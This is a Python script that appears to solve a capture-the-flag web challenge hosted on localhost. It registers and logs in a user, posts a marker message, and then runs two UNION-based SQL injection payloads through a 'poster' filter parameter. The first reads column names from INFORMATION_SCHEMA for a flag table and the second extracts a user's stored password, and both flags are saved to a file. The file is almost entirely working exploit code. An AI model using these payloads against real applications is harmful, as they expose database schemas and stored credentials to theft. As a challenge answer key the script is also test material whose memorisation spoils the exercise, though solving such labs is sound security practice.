#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8081"
    flag_regex = re.compile("(InfoSec{.+[^}]})")
    flag_regex_odd_format = re.compile("(InfoSec.{26})")
    
    # Create new session
    new_session = requests.Session()
   
    # Target user
    username = "abi"
    password = "pass123*"
    login_data = {'username': username, 'password': password}

    # Create user
    new_session.post(url + "/register", data = login_data)

    # Log in
    new_session.post(url + "/login", data = login_data)

    # Post a message
    csrf_token = new_session.cookies.get_dict()["csrf_token"]
    message = "hackerattack"
    message_data = {'content': message, 'csrf_token': csrf_token}
    new_session.post(url + "/post" , data = message_data)

    # SQL Injection #1
    payload1 = "' UNION SELECT post.timestamp, COLUMN_NAME, post.text FROM post, INFORMATION_SCHEMA.COLUMNS WHERE post.text = '" + message + "' AND TABLE_NAME = 'flag' AND NOT COLUMN_NAME = 'id"
    sqli_filter_data1 = {'poster': username + payload1}
    response1 = new_session.get(url + "/logged_in" , params = sqli_filter_data1)

    # Cut out flag1 and save it to a solution file
    flag1 = re.search(flag_regex_odd_format, response1.text).group()
    sol = open("solution.txt", "w")
    sol.write(flag1)

    # SQL Injection #2
    payload2 = "' UNION SELECT p.timestamp, u.password, p.text FROM post p, user u WHERE p.text = '" + message + "' AND u.username = 'flag_user"
    sqli_filter_data2 = {'poster': username + payload2}
    response2 = new_session.get(url + "/logged_in" , params = sqli_filter_data2)

    # Cut out flag2 and save it to the solution file and close it
    flag2 = re.search(flag_regex, response2.text).group()
    sol.write('\n' + flag2)
    sol.close()

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


